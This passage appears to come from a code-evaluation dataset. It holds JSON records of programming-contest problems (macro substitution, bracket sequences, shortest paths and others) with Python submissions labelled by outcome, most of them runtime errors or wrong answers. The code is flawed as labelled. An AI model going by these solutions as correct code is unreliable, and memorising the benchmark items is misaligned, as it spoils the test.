25"],"sample_outputs":["YES","NO","NO"]}
{"difficulty":2600,"lang":"Python 2","lang_cluster":"python","src_uid":"7_E","submission_id":"2875328","tags":["dp","expression+parsing","implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"SUSPICIOUS = -128\r\nNIL = 0\r\nADD = 1\r\nSUB = 2\r\nMUL = 4\r\nDIV = 8\r\nALL = 15\r\n\r\nop_value = {'+': ADD, '-': SUB, '*': MUL, '\/': DIV}\r\ninvalid = {NIL: (NIL,        NIL),\r\n           ADD: (NIL,        NIL),\r\n           SUB: (NIL,        ADD | SUB), \r\n           MUL: (ADD | SUB,  ADD | SUB),\r\n           DIV: (ADD | SUB,  ALL)} \r\n\r\n\r\ndef validate(expr):\r\n    global definitions\r\n\r\n    ## Initialize validation variables\r\n    last_op = 0\r\n    operators = 0\r\n    last_token = 0\r\n\r\n    ## Initialize parsing variables\r\n    token = \"\"\r\n    paren_depth = 0\r\n\r\n    ## Iterate the expression\r\n    for c in expr:\r\n\r\n        ## Handle sub-expressions\r\n        if c == '(':\r\n            paren_depth += 1\r\n\r\n        elif c == ')':\r\n            paren_depth -= 1\r\n\r\n            ## No validation necessary\r\n            ## (besides non-suspiciousness)\r\n            if paren_depth == 0:\r\n                if validate(token) == SUSPICIOUS:\r\n                    return SUSPICIOUS\r\n                \r\n                token = \"\"\r\n\r\n        ## Perform validation\r\n        elif paren_depth == 0 and c in '*\/+-':\r\n            ## Validate last_op + last_token\r\n            if token != \"\":\r\n                last_token = definitions.get(token, 0)\r\n                #print 1, last_token, last_op, invalid[last_op][1]\r\n                if last_token == SUSPICIOUS or last_token & invalid[last_op][1]:\r\n                    #print bin(SUSPICIOUS)[2:]\r\n                    return SUSPICIOUS\r\n\r\n                token = \"\"\r\n\r\n            ## Update validation variables\r\n            last_op = op_value[c]\r\n            operators |= last_op\r\n\r\n            ## Validate last_token + last_op\r\n            #print 2, last_token, last_op, invalid[last_op][0]\r\n            if last_token & invalid[last_op][0]:\r\n                #print bin(SUSPICIOUS)[2:]\r\n                return SUSPICIOUS\r\n\r\n        else:\r\n            token += c\r\n\r\n    if token != \"\":\r\n        last_token = definitions.get(token, 0)\r\n        #print 1, last_token, last_op, invalid[last_op][1]\r\n        if last_token == SUSPICIOUS or last_token & invalid[last_op][1]:\r\n            #print bin(SUSPICIOUS)[2:]\r\n            return SUSPICIOUS\r\n\r\n    return operators\r\n\r\n\r\n\r\ndefinitions = {}\r\n\r\nn = input()\r\n\r\nfor i in range(n):\r\n    line = raw_input().split()\r\n    \r\n    if line[0] == '#':\r\n        head = line[2]\r\n        line = line[3:]\r\n    else:\r\n        head = line[1]\r\n        line = line[2:]\r\n\r\n    definitions[head] = validate(\"\".join(line))\r\n    \r\n    #print head, bin(definitions[head])[2:]\r\n\r\n    \r\nexpr = validate(\"\".join(raw_input().split()))\r\nprint \"Suspicious\"    if expr == SUSPICIOUS else    \"OK\"\r\n","description":"Most C\/C++ programmers know about excellent opportunities that preprocessor #define directives give; but many know as well about the problems that can arise because of their careless use.In this problem we consider the following model of #define constructions (also called macros). Each macro has its name and value. The generic syntax for declaring a macro is the following:#define macro_name macro_valueAfter the macro has been declared, \"macro_name\" is replaced with \"macro_value\" each time it is met in the program (only the whole tokens can be replaced; i.e. \"macro_name\" is replaced only when it is surrounded by spaces or other non-alphabetic symbol). A \"macro_value\" within our model can only be an arithmetic expression consisting of variables, four arithmetic operations, brackets, and also the names of previously declared macros (in this case replacement is performed sequentially). The process of replacing macros with their values is called substitution.One of the main problems arising while using macros \u2014 the situation when as a result of substitution we get an arithmetic expression with the changed order of calculation because of different priorities of the operations.Let's consider the following example. Say, we declared such a #define construction:#define sum x + yand further in the program the expression \"2 * sum\" is calculated. After macro substitution is performed we get \"2 * x + y\", instead of intuitively expected \"2 * (x + y)\".Let's call the situation \"suspicious\", if after the macro substitution the order of calculation changes, falling outside the bounds of some macro. Thus, your task is to find out by the given set of #define definitions and the given expression if this expression is suspicious or not.Let's speak more formally. We should perform an ordinary macros substitution in the given expression. Moreover, we should perform a \"safe\" macros substitution in the expression, putting in brackets each macro value; after this, guided by arithmetic rules of brackets expansion, we can omit some of the brackets. If there exist a way to get an expression, absolutely coinciding with the expression that is the result of an ordinary substitution (character-by-character, but ignoring spaces), then this expression and the macros system are called correct, otherwise \u2014 suspicious.Note that we consider the \"\/\" operation as the usual mathematical division, not the integer division like in C\/C++. That's why, for example, in the expression \"a*(b\/c)\" we can omit brackets to get the expression \"a*b\/c\".","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the only number n (0\u2264n\u2264100) \u2014 the amount of #define constructions in the given program.\nThen there follow n lines, each of them contains just one #define construction. Each construction has the following syntax:\n#define name expression\nwhere\n  name \u2014 the macro name,  expression \u2014 the expression with which the given macro will be replaced. An expression is a non-empty string, containing digits,names of variables, names of previously declared macros, round brackets and operational signs +-*\/. It is guaranteed that the expression (before and after macros substitution) is a correct arithmetic expression, having no unary operations. The expression contains only non-negative integers, not exceeding 10^9. All the names (#define constructions' names and names of their arguments) are strings of case-sensitive Latin characters. It is guaranteed that the name of any variable is different from any #define construction.\nThen, the last line contains an expression that you are to check. This expression is non-empty and satisfies the same limitations as the expressions in #define constructions.\nThe input lines may contain any number of spaces anywhere, providing these spaces do not break the word \"define\" or the names of constructions and variables. In particular, there can be any number of spaces before and after the \"#\" symbol.\nThe length of any line from the input file does not exceed 100 characters.\n","output_spec":"Output \"OK\", if the expression is correct according to the above given criterion, otherwise output \"Suspicious\".\n","notes":null,"sample_inputs":["1\n#define sum x + y\n1 * sum\n","1\n#define sum  (x + y)\nsum - sum\n","4\n#define sum  x + y\n#define mul  a * b\n#define div  a \/ b\n#define expr sum + mul * div * mul\nexpr\n","3\n#define SumSafe   (a+b)\n#define DivUnsafe  a\/b\n#define DenominatorUnsafe  a*b\n((SumSafe) + DivUnsafe\/DivUnsafe + x\/DenominatorUnsafe)\n"],"sample_outputs":["Suspicious\n","OK\n","OK\n","Suspicious\n"]}
{"difficulty":1700,"lang":"Python 2","lang_cluster":"python","src_uid":"867facaa8bcdfcb53ec3647387f7d23f","submission_id":"re_95","tags":["sortings","greedy","math"],"exec_outcome":"RUNTIME_ERROR","source_code":"#!\/usr\/bin\/python\n# -*- coding: utf-8 -*- \n\nfrom itertools import combinations\n\nn = int(raw_input(''))\na,b = [int(x) for x in (raw_input('')).split(' ')]\ns = [int(x) for x in (raw_input('')).split(' ')]\n\nmaxs = 0.0\nres = None\nmaxst = ''\n\nfor c in combinations( xrange(0,n), a ):\n    f = [ 0 for x in xrange(0,n) ]    \n    for t in c:\n        f[t] = 1\n\n    sum1 = 0\n    sum2 = 0\n    for i in xrange(0,n):\n        if f[i] == 1:\n            sum1 += s[i]\n        else:\n            sum2 += s[i]\n\n    ss = float(sum1)\/float(a) + float(sum2)\/float(b)\n    st = ''.join( [ str(2-x) for x in f ] )\n\n    if ss == maxs:\n        if st < maxst:            \n            maxst = st\n            res = f[:]\n    elif ss-1e-8 > maxs:\n        maxs = ss\n        maxst = st\n        res = f[:]\n       \n\n\n        maxs = ss\nr = ''\ni = 0\nwhile i < len(res):\n    if r != '':\n        r += ' '\n    r += str(2-res[i])\n    i += 1\n\nprint r\n\n","description":"After the educational reform Polycarp studies only two subjects at school, Safety Studies and PE (Physical Education). During the long months of the fourth term, he received n marks in them. When teachers wrote a mark in the journal, they didn't write in what subject the mark was for, they just wrote the mark.Now it's time to show the journal to his strict parents. Polycarp knows that recently at the Parent Meeting the parents were told that he received a Safety Studies marks and b PE marks (a\u2009+\u2009b\u2009=\u2009n). Now Polycarp wants to write a subject's name in front of each mark so that:   there are exactly a Safety Studies marks,  there are exactly b PE marks,  the total average score in both subjects is maximum. An average subject grade is the sum of all marks in it, divided by the number of them. Of course, the division is performed in real numbers without rounding up or down. Polycarp aims to maximize the x1\u2009+\u2009x2, where x1 is the average score in the first subject (Safety Studies), and x2 is the average score in the second one (Physical Education).","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains an integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009105), n is the number of marks in Polycarp's Journal. The second line contains two positive integers a,\u2009b (1\u2009\u2264\u2009a,\u2009b\u2009\u2264\u2009n\u2009-\u20091,\u2009a\u2009+\u2009b\u2009=\u2009n). The third line contains a sequence of integers t1,\u2009t2,\u2009...,\u2009tn (1\u2009\u2264\u2009ti\u2009\u2264\u20095), they are Polycarp's marks.","output_spec":"Print the sequence of integers f1,\u2009f2,\u2009...,\u2009fn, where fi (1\u2009\u2264\u2009fi\u2009\u2264\u20092) is the number of a subject to which the i-th mark should be attributed. If there are several possible solutions, then print such that the sequence f1,\u2009f2,\u2009...,\u2009fn is the smallest lexicographically. The sequence p1,\u2009p2,\u2009...,\u2009pn is lexicographically less than q1,\u2009q2,\u2009...,\u2009qn if there exists such j (1\u2009\u2264\u2009j\u2009\u2264\u2009n) that pi\u2009=\u2009qi for all 1\u2009\u2264\u2009i\u2009&lt;\u2009j, \u0430nd pj\u2009&lt;\u2009qj.","notes":"NoteIn the first sample the average score in the first subject is equal to 4, and in the second one \u2014 to 4.5. The total average score is 8.5.","sample_inputs":["5\n3 2\n4 4 5 4 4","4\n2 2\n3 5 4 5","6\n1 5\n4 4 4 5 4 4"],"sample_outputs":["1 1 2 1 2","1 1 2 2","2 2 2 1 2 2"]}
{"difficulty":2600,"lang":"PyPy 2","lang_cluster":"python","src_uid":"970cd8ce0cf7214b7f2be337990557c9","submission_id":"re_1035","tags":["greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"import heapq \ne=raw_input()\nc=0\nk=0\nl=[0]*len(e)\nheap=[]\nfor i in xrange(len(e)):\n    if e[i]==\"(\":\n        l[i]=\"(\"\n        k+=1\n    elif e[i]==\")\":\n        l[i]=\")\"\n        k-=1\n        \n        \n    else:\n        a,b=map(int,raw_input().split())\n        c+=b\n        heapq.heappush(heap,(a-b,i))\n        l[i]=\")\"\n        k-=1\n   \n    if k<0 and heap:\n          v,ind=heapq.heappop(heap)\n          c+=v\n          l[ind]=\"(\"\n          k+=2\nif k!=0:\n  print -1\n  \nelse:  \n\n print c\n print \"\".join(l)\n        ","description":"This is yet another problem on regular bracket sequences.A bracket sequence is called regular, if by inserting \"+\" and \"1\" into it we get a correct mathematical expression. For example, sequences \"(())()\", \"()\" and \"(()(()))\" are regular, while \")(\", \"(()\" and \"(()))(\" are not. You have a pattern of a bracket sequence that consists of characters \"(\", \")\" and \"?\". You have to replace each character \"?\" with a bracket so, that you get a regular bracket sequence.For each character \"?\" the cost of its replacement with \"(\" and \")\" is given. Among all the possible variants your should choose the cheapest.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a non-empty pattern of even length, consisting of characters \"(\", \")\" and \"?\". Its length doesn't exceed 5\u00b7104. Then there follow m lines, where m is the number of characters \"?\" in the pattern. Each line contains two integer numbers ai and bi (1\u2009\u2264\u2009ai,\u2009\u2009bi\u2009\u2264\u2009106), where ai is the cost of replacing the i-th character \"?\" with an opening bracket, and bi \u2014 with a closing one.","output_spec":"Print the cost of the optimal regular bracket sequence in the first line, and the required sequence in the second. Print -1, if there is no answer. If the answer is not unique, print any of them. ","notes":null,"sample_inputs":["(??)\n1 2\n2 8"],"sample_outputs":["4\n()()"]}
{"difficulty":2600,"lang":"PyPy 3","lang_cluster":"python","src_uid":"ba9c136f84375cd317f0f8b53e3939c7","submission_id":"re_565","tags":["dp","probabilities"],"exec_outcome":"RUNTIME_ERROR","source_code":"P = 998244353\nN, M = map(int, input().split())\nA = [int(a) for a in input().split()]\nB = [int(a) for a in input().split()]\nli = sum([A[i]*B[i] for i in range(N)])\ndi = sum([(A[i]^1)*B[i] for i in range(N)])\nX = [[] for _ in range(M+1)]\n\nX[0] = [1]\ndef calc(L):\n    su = sum(L)\n    pl = 0\n    pd = 0\n    RE = []\n    for i in range(len(L)):\n        a = li + i\n        b = di - (len(L) - 1 - i)\n        pd = b * L[i] * pow(su*(a+b), P-2, P)\n        RE.append((pl+pd)%P)\n        pl = a * L[i] * pow(su*(a+b), P-2, P)\n    RE.append(pl%P)\n    return RE\n\nfor i in range(M):\n    X[i+1] = calc(X[i])\nne = 0\npo = 0\nfor i in range(M+1):\n    po = (po + X[M][i] * (li + i)) % P\n    ne = (ne + X[M][i] * (di + i)) % P\nfor i in range(N):\n    print(po * B[i] * pow(li, P-2, P) % P if A[i] else ne * B[i] * pow(di, P-2, P) % P)\n","description":"The only difference between easy and hard versions is constraints.Nauuo is a girl who loves random picture websites.One day she made a random picture website by herself which includes $$$n$$$ pictures.When Nauuo visits the website, she sees exactly one picture. The website does not display each picture with equal probability. The $$$i$$$-th picture has a non-negative weight $$$w_i$$$, and the probability of the $$$i$$$-th picture being displayed is $$$\\frac{w_i}{\\sum_{j=1}^nw_j}$$$. That is to say, the probability of a picture to be displayed is proportional to its weight.However, Nauuo discovered that some pictures she does not like were displayed too often. To solve this problem, she came up with a great idea: when she saw a picture she likes, she would add $$$1$$$ to its weight; otherwise, she would subtract $$$1$$$ from its weight.Nauuo will visit the website $$$m$$$ times. She wants to know the expected weight of each picture after all the $$$m$$$ visits modulo $$$998244353$$$. Can you help her?The expected weight of the $$$i$$$-th picture can be denoted by $$$\\frac {q_i} {p_i}$$$ where $$$\\gcd(p_i,q_i)=1$$$, you need to print an integer $$$r_i$$$ satisfying $$$0\\le r_i&lt;998244353$$$ and $$$r_i\\cdot p_i\\equiv q_i\\pmod{998244353}$$$. It can be proved that such $$$r_i$$$ exists and is unique.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers $$$n$$$ and $$$m$$$ ($$$1\\le n\\le 2\\cdot 10^5$$$, $$$1\\le m\\le 3000$$$) \u2014 the number of pictures and the number of visits to the website. The second line contains $$$n$$$ integers $$$a_1,a_2,\\ldots,a_n$$$ ($$$a_i$$$ is either $$$0$$$ or $$$1$$$) \u2014 if $$$a_i=0$$$ , Nauuo does not like the $$$i$$$-th picture; otherwise Nauuo likes the $$$i$$$-th picture. It is guaranteed that there is at least one picture which Nauuo likes. The third line contains $$$n$$$ positive integers $$$w_1,w_2,\\ldots,w_n$$$ ($$$w_i \\geq 1$$$) \u2014 the initial weights of the pictures. It is guaranteed that the sum of all the initial weights does not exceed $$$998244352-m$$$.","output_spec":"The output contains $$$n$$$ integers $$$r_1,r_2,\\ldots,r_n$$$ \u2014 the expected weights modulo $$$998244353$$$.","notes":"NoteIn the first example, if the only visit shows the first picture with a probability of $$$\\frac 2 3$$$, the final weights are $$$(1,1)$$$; if the only visit shows the second picture with a probability of $$$\\frac1 3$$$, the final weights are $$$(2,2)$$$.So, both expected weights are $$$\\frac2 3\\cdot 1+\\frac 1 3\\cdot 2=\\frac4 3$$$ .Because $$$332748119\\cdot 3\\equiv 4\\pmod{998244353}$$$, you need to print $$$332748119$$$ instead of $$$\\frac4 3$$$ or $$$1.3333333333$$$.In the second example, there is only one picture which Nauuo likes, so every time Nauuo visits the website, $$$w_1$$$ will be increased by $$$1$$$.So, the expected weight is $$$1+2=3$$$.Nauuo is very naughty so she didn't give you any hint of the third example.","sample_inputs":["2 1\n0 1\n2 1","1 2\n1\n1","3 3\n0 1 1\n4 3 5"],"sample_outputs":["332748119\n332748119","3","160955686\n185138929\n974061117"]}
{"difficulty":1900,"lang":"Python 3","lang_cluster":"python","src_uid":"bc8b4b74c2f2d486e2d2f03982ef1013","submission_id":"re_933","tags":["two pointers","dsu","data structures","binary search","trees"],"exec_outcome":"RUNTIME_ERROR","source_code":"#from collections import deque\nn,k=[int(i) for i in input().split()]\nbooks=[int(i) for i in input().split()]\nres=[]\nM=1\nMcnt=0\nfor l in range(n) :\n    if n-l<M :\n        break\n    maxt=max(books[l:l+M])\n    mint=min(books[l:l+M])\n    for r in range(l+M-1,n) :\n        maxp=maxt\n        minp=mint\n        maxt=books[r] if books[r]>maxt else maxt\n        mint=books[r] if books[r]<mint else mint\n        if (maxt-mint>k):\n            if not(maxp-minp<=k) :\n                break\n            res.append([l+1,r])\n            if r-l>M :\n                M=r-l\n                Mcnt=1\n            elif r-l==M :\n                Mcnt+=1\n            break\nprint(M,Mcnt)\nfor i in range(Mcnt) :\n    print(res[-Mcnt+i][0],res[-Mcnt+i][1])","description":"There are several days left before the fiftieth birthday of a famous Berland's writer Berlbury. In this connection the local library decided to make an exposition of the works of this famous science-fiction writer. It was decided as well that it is necessary to include into the exposition only those books that were published during a particular time period. It is obvious that if the books differ much in size, the visitors will not like it. That was why the organizers came to the opinion, that the difference between the highest and the lowest books in the exposition should be not more than k millimeters.The library has n volumes of books by Berlbury, arranged in chronological order of their appearance. The height of each book in millimeters is know, it is hi. As Berlbury is highly respected in the city, the organizers want to include into the exposition as many books as possible, and to find out what periods of his creative work they will manage to cover. You are asked to help the organizers cope with this hard task.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input data contains two integer numbers separated by a space n (1\u2009\u2264\u2009n\u2009\u2264\u2009105) and k (0\u2009\u2264\u2009k\u2009\u2264\u2009106) \u2014 the amount of books by Berlbury in the library, and the maximum allowed height difference between the lowest and the highest books. The second line contains n integer numbers separated by a space. Each number hi (1\u2009\u2264\u2009hi\u2009\u2264\u2009106) is the height of the i-th book in millimeters.","output_spec":"In the first line of the output data print two numbers a and b (separate them by a space), where a is the maximum amount of books the organizers can include into the exposition, and b \u2014 the amount of the time periods, during which Berlbury published a books, and the height difference between the lowest and the highest among these books is not more than k milllimeters. In each of the following b lines print two integer numbers separated by a space \u2014 indexes of the first and the last volumes from each of the required time periods of Berlbury's creative work.","notes":null,"sample_inputs":["3 3\n14 12 10","2 0\n10 10","4 5\n8 19 10 13"],"sample_outputs":["2 2\n1 2\n2 3","2 1\n1 2","2 1\n3 4"]}
{"difficulty":1700,"lang":"Python 3","lang_cluster":"python","src_uid":"c175d010d75c391d0b25391fecff007c","submission_id":"re_764","tags":["implementation","greedy","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"n = int(input())\n\nl = []\nfor i in range(n):\n    l.append(int(input()))\n\ndef repair(x, y, r):\n    if(r == 0):\n        return x\n    \n    z = (x % (10 * r)) \/\/ r - (y % (10 * r)) \/\/ r\n    \n    if(z == 0):\n        return repair(x, y, r \/\/ 10)\n        \n    if(x % r >= y % r):\n        return x - z * r\n    else:\n        return x - z * r + r\n\ny = 1000\ntry:\n    for i in range(n):\n        l[i] = repair(l[i], y, 1000)\n        if(l[i] > 2011):\n            raise Exception()\n        y = l[i]\n    \n    for i in l:\n        print(i)\nexcept:\n    print(\"No solution\")","description":"The History of Magic is perhaps the most boring subject in the Hogwarts school of Witchcraft and Wizardry. Harry Potter is usually asleep during history lessons, and his magical quill writes the lectures for him. Professor Binns, the history of magic teacher, lectures in such a boring and monotonous voice, that he has a soporific effect even on the quill. That's why the quill often makes mistakes, especially in dates.So, at the end of the semester Professor Binns decided to collect the students' parchments with notes and check them. Ron Weasley is in a panic: Harry's notes may contain errors, but at least he has some notes, whereas Ron does not have any. Ronald also has been sleeping during the lectures and his quill had been eaten by his rat Scabbers. Hermione Granger refused to give Ron her notes, because, in her opinion, everyone should learn on their own. Therefore, Ron has no choice but to copy Harry's notes.Due to the quill's errors Harry's dates are absolutely confused: the years of goblin rebellions and other important events for the wizarding world do not follow in order, and sometimes even dates from the future occur. Now Ron wants to change some of the digits while he copies the notes so that the dates were in the chronological (i.e. non-decreasing) order and so that the notes did not have any dates strictly later than 2011, or strictly before than 1000. To make the resulting sequence as close as possible to the one dictated by Professor Binns, Ron will change no more than one digit in each date into other digit. Help him do it.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains an integer n (1\u2009\u2264\u2009n\u2009\u2264\u20091000). It represents the number of dates in Harry's notes. Next n lines contain the actual dates y1, y2, ..., yn, each line contains a date. Each date is a four-digit integer (1000\u2009\u2264\u2009yi\u2009\u2264\u20099999).","output_spec":"Print n numbers z1, z2, ..., zn (1000\u2009\u2264\u2009zi\u2009\u2264\u20092011). They are Ron's resulting dates. Print each number on a single line. Numbers zi must form the non-decreasing sequence. Each number zi should differ from the corresponding date yi in no more than one digit. It is not allowed to change the first digit of a number into 0. If there are several possible solutions, print any of them. If there's no solution, print \"No solution\" (without the quotes).","notes":null,"sample_inputs":["3\n1875\n1936\n1721","4\n9999\n2000\n3000\n3011","3\n1999\n5055\n2000"],"sample_outputs":["1835\n1836\n1921","1999\n2000\n2000\n2011","No solution"]}
{"difficulty":2600,"lang":"PyPy 2","lang_cluster":"python","src_uid":"c23d3ec2b9fb4b4d169bc8053bfd000e","submission_id":"re_1468","tags":["dp","implementation","expression parsing"],"exec_outcome":"RUNTIME_ERROR","source_code":"SUSPICIOUS = -128\nNIL = 0\nADD = 1\nSUB = 2\nMUL = 4\nDIV = 8\nALL = 15\n\nop_value = {'+': ADD, '-': SUB, '*': MUL, '\/': DIV}\ninvalid = {NIL: (NIL,        NIL),\n           ADD: (NIL,        NIL),\n           SUB: (NIL,        ADD | SUB), \n           MUL: (ADD | SUB,  ADD | SUB),\n           DIV: (ADD | SUB,  ALL)} \n\n\ndef validate(expr):\n    global definitions\n\n    ## Initialize validation variables\n    last_op = 0\n    operators = 0\n    last_token = 0\n\n    ## Initialize parsing variables\n    token = \"\"\n    paren_depth = 0\n\n    ## Iterate the expression\n    for c in expr:\n\n        ## Handle sub-expressions\n        if c == '(':\n            #if paren_depth > 0:\n            token += c\n            paren_depth += 1\n\n        elif c == ')':\n            paren_depth -= 1\n\n            ## No validation necessary\n            ## (besides non-suspiciousness)\n            if paren_depth == 0:\n                if validate(token) == SUSPICIOUS:\n                    return SUSPICIOUS\n                \n                token = \"\"\n                last_op = 0\n                last_token = 0\n                \n            else:\n                token += c\n\n        ## Perform validation\n        elif paren_depth == 0 and c in '*\/+-':\n            ## Validate last_op + last_token\n            if token != \"\":\n                last_token = definitions.get(token, 0)\n                if last_token == SUSPICIOUS or last_token & invalid[last_op][1]:\n                    return SUSPICIOUS\n\n                token = \"\"\n\n                ## Validate last_token + last_op\n                if last_token & invalid[op_value[c]][0]:\n                    return SUSPICIOUS\n\n                last_token = 0\n\n            ## Update validation variables\n            last_op = op_value[c]\n            operators |= last_op\n\n        else:\n            token += c\n\n    if token != \"\":\n        last_token = definitions.get(token, 0)\n        if last_token == SUSPICIOUS or last_token & invalid[last_op][1]:\n            return SUSPICIOUS\n\n    return operators\n\n\n\ndefinitions = {}\n\nn = input()\n\nfor i in range(n):\n    line = raw_input().split()\n    \n    if line[0] == '#':\n        head = line[2]\n        line = line[3:]\n    else:\n        head = line[1]\n        line = line[2:]\n\n    definitions[head] = validate(\"\".join(line))\n    \n    #print head, bin(definitions[head])[2:]\n\n    \nexpr = validate(\"\".join(raw_input().split()))\nprint \"Suspicious\"    if expr == SUSPICIOUS else    \"OK\"","description":"Most C\/C++ programmers know about excellent opportunities that preprocessor #define directives give; but many know as well about the problems that can arise because of their careless use.In this problem we consider the following model of #define constructions (also called macros). Each macro has its name and value. The generic syntax for declaring a macro is the following:#define macro_name macro_valueAfter the macro has been declared, \"macro_name\" is replaced with \"macro_value\" each time it is met in the program (only the whole tokens can be replaced; i.e. \"macro_name\" is replaced only when it is surrounded by spaces or other non-alphabetic symbol). A \"macro_value\" within our model can only be an arithmetic expression consisting of variables, four arithmetic operations, brackets, and also the names of previously declared macros (in this case replacement is performed sequentially). The process of replacing macros with their values is called substitution.One of the main problems arising while using macros \u2014 the situation when as a result of substitution we get an arithmetic expression with the changed order of calculation because of different priorities of the operations.Let's consider the following example. Say, we declared such a #define construction:#define sum x + yand further in the program the expression \"2 * sum\" is calculated. After macro substitution is performed we get \"2 * x + y\", instead of intuitively expected \"2 * (x + y)\".Let's call the situation \"suspicious\", if after the macro substitution the order of calculation changes, falling outside the bounds of some macro. Thus, your task is to find out by the given set of #define definitions and the given expression if this expression is suspicious or not.Let's speak more formally. We should perform an ordinary macros substitution in the given expression. Moreover, we should perform a \"safe\" macros substitution in the expression, putting in brackets each macro value; after this, guided by arithmetic rules of brackets expansion, we can omit some of the brackets. If there exist a way to get an expression, absolutely coinciding with the expression that is the result of an ordinary substitution (character-by-character, but ignoring spaces), then this expression and the macros system are called correct, otherwise \u2014 suspicious.Note that we consider the \"\/\" operation as the usual mathematical division, not the integer division like in C\/C++. That's why, for example, in the expression \"a*(b\/c)\" we can omit brackets to get the expression \"a*b\/c\".","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the only number n (0\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 the amount of #define constructions in the given program. Then there follow n lines, each of them contains just one #define construction. Each construction has the following syntax: #define name expression where   name \u2014 the macro name,  expression \u2014 the expression with which the given macro will be replaced. An expression is a non-empty string, containing digits,names of variables, names of previously declared macros, round brackets and operational signs +-*\/. It is guaranteed that the expression (before and after macros substitution) is a correct arithmetic expression, having no unary operations. The expression contains only non-negative integers, not exceeding 109.  All the names (#define constructions' names and names of their arguments) are strings of case-sensitive Latin characters. It is guaranteed that the name of any variable is different from any #define construction. Then, the last line contains an expression that you are to check. This expression is non-empty and satisfies the same limitations as the expressions in #define constructions. The input lines may contain any number of spaces anywhere, providing these spaces do not break the word \"define\" or the names of constructions and variables. In particular, there can be any number of spaces before and after the \"#\" symbol. The length of any line from the input file does not exceed 100 characters.","output_spec":"Output \"OK\", if the expression is correct according to the above given criterion, otherwise output \"Suspicious\".","notes":null,"sample_inputs":["1\n#define sum x + y\n1 * sum","1\n#define sum  (x + y)\nsum - sum","4\n#define sum  x + y\n#define mul  a * b\n#define div  a \/ b\n#define expr sum + mul * div * mul\nexpr","3\n#define SumSafe   (a+b)\n#define DivUnsafe  a\/b\n#define DenominatorUnsafe  a*b\n((SumSafe) + DivUnsafe\/DivUnsafe + x\/DenominatorUnsafe)"],"sample_outputs":["Suspicious","OK","OK","Suspicious"]}
{"difficulty":1600,"lang":"PyPy 3","lang_cluster":"python","src_uid":"c4b7265ff4332225c0d5617c3233a910","submission_id":"re_1327","tags":["dsu","dfs and similar","graphs"],"exec_outcome":"RUNTIME_ERROR","source_code":"f = lambda: list(map(int, input().split()))\nn, p, d = f()[0], f(), f()\nc = list(range(n))\ndef g(x):\n    if c[x] != x: c[x] = g(c[x])\n    return c[x]\nfor x, k in zip(c, d):\n    if x >= k: c[g(x)] = g(x - k)\n    if x < n - k: c[g(x)] = g(x + k)\nprint('YES' if all(g(x) == g(y - 1) for x, y in zip(c, p)) else 'NO')","description":"One day n cells of some array decided to play the following game. Initially each cell contains a number which is equal to it's ordinal number (starting from 1). Also each cell determined it's favourite number. On it's move i-th cell can exchange it's value with the value of some other j-th cell, if |i\u2009-\u2009j|\u2009=\u2009di, where di is a favourite number of i-th cell. Cells make moves in any order, the number of moves is unlimited.The favourite number of each cell will be given to you. You will also be given a permutation of numbers from 1 to n. You are to determine whether the game could move to this state.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains positive integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 the number of cells in the array. The second line contains n distinct integers from 1 to n \u2014 permutation. The last line contains n integers from 1 to n \u2014 favourite numbers of the cells.","output_spec":"If the given state is reachable in the described game, output YES, otherwise NO.","notes":null,"sample_inputs":["5\n5 4 3 2 1\n1 1 1 1 1","7\n4 3 5 1 2 7 6\n4 6 6 1 6 6 1","7\n4 2 5 1 3 7 6\n4 6 6 1 6 6 1"],"sample_outputs":["YES","NO","YES"]}
{"difficulty":1700,"lang":"Python 3","lang_cluster":"python","src_uid":"d5fbb3033bd7508fd468edb9bb995d6c","submission_id":"re_824","tags":["data structures","binary search","graphs","shortest paths"],"exec_outcome":"RUNTIME_ERROR","source_code":"from heapq import *\nINF = 1e16\nviajantes = []\n\nN,M = map(int,input().split())\n\ngalaxia = [[] for i in range(100002)]\ntempo = [INF] * (N+1)\n\n\nfor i in range(M):\n    a,b,c = map(int,input().split())\n    galaxia[a] += [(c,b)]\n    galaxia[b] += [(c,a)]\n\nfor j in range(N):\n    vi = list(map(int,input().split()))\n    viajantes.append(vi[1::])\n\ndef visitante_chegando(w,a):\n    for x in viajantes[a-1]:\n        if x == w:\n            w += 1\n    return w\n\ndef dijsktra(u,v,galaxia):\n    tempo[u] = 0\n    q = [(0,u)]\n\n    while q:\n        z,a = heappop(q)\n        #a[0] = dist\u00e2ncia\n        #a[1] = vertice\n        #tempo[a[1]] melhor tempo que cheguei em a[1]\n        #if a[0] == tempo[a[1]]:\n        if z <= tempo[a]:\n            w2 = tempo[a]\n            w2 = visitante_chegando(w2,a)\n            for adj in galaxia[a]:\n                w,b = w2 + adj[0],adj[1]\n                print(w)\n                if w < tempo[b]:\n                    tempo[b] = w\n                    heappush(q,(tempo[b],b))\n    return tempo\n\n\nd = dijsktra(1,N,galaxia)\nif d[-1] == INF:\n    print(-1)\nelse:\n    print(d[N])\n","description":"Goa'uld Apophis captured Jack O'Neill's team again! Jack himself was able to escape, but by that time Apophis's ship had already jumped to hyperspace. But Jack knows on what planet will Apophis land. In order to save his friends, Jack must repeatedly go through stargates to get to this planet.Overall the galaxy has n planets, indexed with numbers from 1 to n. Jack is on the planet with index 1, and Apophis will land on the planet with index n. Jack can move between some pairs of planets through stargates (he can move in both directions); the transfer takes a positive, and, perhaps, for different pairs of planets unequal number of seconds. Jack begins his journey at time 0.It can be that other travellers are arriving to the planet where Jack is currently located. In this case, Jack has to wait for exactly 1 second before he can use the stargate. That is, if at time t another traveller arrives to the planet, Jack can only pass through the stargate at time t\u2009+\u20091, unless there are more travellers arriving at time t\u2009+\u20091 to the same planet.Knowing the information about travel times between the planets, and the times when Jack would not be able to use the stargate on particular planets, determine the minimum time in which he can get to the planet with index n.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space-separated integers: n (2\u2009\u2264\u2009n\u2009\u2264\u2009105), 